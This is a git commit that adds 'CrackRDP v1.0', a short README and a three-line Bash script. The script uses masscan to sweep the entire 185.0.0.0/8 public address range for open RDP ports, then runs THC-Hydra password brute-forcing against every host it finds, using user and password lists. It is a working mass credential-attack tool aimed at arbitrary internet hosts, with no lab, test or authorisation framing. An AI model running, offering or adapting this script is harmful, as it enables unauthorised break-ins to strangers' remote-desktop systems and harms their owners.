1bf9778f697cec73d25d9ff49d21991808dff19a
independent <ind3p3nd3nt@outlook.com>
2020-04-04 13:56:38 -0400

    crackrdp v1.0

---
+++ rdpcrack/README.md
@@ -0,0 +1,5 @@
+# CrackRDP v1.0
+Bash script to crack rdp with THC-Hydra
+
+# USAGE
+sh crack.sh
---
+++ rdpcrack/crack.sh
@@ -0,0 +1,3 @@
+sudo masscan --range 185.0.0.0-185.255.255.255 --rate 50000 -p3389 --open --banners -oG rdp.scan;
+for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do sleep 5 && hydra -vv rdp://$i -L user -P pass -t1 -W3 -I >hydra.log;
+done
